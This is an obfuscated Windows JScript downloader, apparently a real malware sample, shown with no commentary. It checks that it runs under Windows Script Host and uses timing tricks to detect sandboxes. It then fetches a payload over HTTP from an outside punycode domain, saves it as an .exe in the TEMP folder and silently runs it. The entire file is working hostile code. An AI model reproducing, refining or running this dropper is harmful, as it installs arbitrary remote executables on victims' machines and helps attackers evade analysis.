var xC = false;
var q = "CreateObject";
var iC = function cE() {return WScript[q]("WScript.Shell");}(), I = 11;
var T = "MSXML2.XMLHTTP";
var O = 2123213;
var r = 0;
function Q(TU){iC["Run"](TU, r, r);};
function IL(){return "" + T;};
function g(We, Tc){r = r * 1; return We - Tc;};
function B(){return q;};
/*@cc_on
  @if (@_win32 || @_win64)
    xC = true;
  @end
@*/
if (xC)
{
var R = "";
function E(){return 22;};
var J = 0; var mV = 0;
function lJ()
{
var n = new this["Date"]();
var b = n["getUTCMilliseconds"]();
WScript["Sleep"](E());
var n = new this["Date"]();
var D = n["getUTCMilliseconds"]();
WScript["Sleep"](E());
var n = new this["Date"]();
var q0 = n["getUTCMilliseconds"]();
var J = "j";
J = g(D, b);
var mV = "M";
mV = g(q0, D);
R = "open";
return g(J, mV);
}
var X = false;
var yI = false;
for (var Q0 = r; Q0 < E() * 1; Q0++){if (lJ() != r){
X = true; 
mV = "31" + 11 * J + mV; 
yI = true; 
break;
}}
function G() {return ((X == true) && (X == yI)) ? 1 : r;};
if (X && G() && yI){
function RH() {return iC["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "lBc9XKR6.exe";};
 IS = IL();
 yi = WScript[q](IS);
 var Dd = 1;
 while (Dd){
try {
yi[R]("GET", "http://xn--kandypriv-j4a.com/lo4sad", false);
yi["send"]();
A1 = "Sleep";
for (;;){WScript[A1](E() * 11); if (yi["readystate"] >= 2 * 2) break;};
Dd = r;
} catch(h){};
}
function A(Z) {var A0 = (1, 2, 3, 4, 5, Z); return A0;};
x = WScript[B()]("ADODB.Stream");
IS = x;
IS[R]();
IS["type"] = A(1);
IS["write"](yi["ResponseBody"]);
x["position"] = A(r);
IS["Save" + "ToFile"](RH(), 2);
x["c"+"lose"]();
E0 = RH();
Q(E0);
}
}

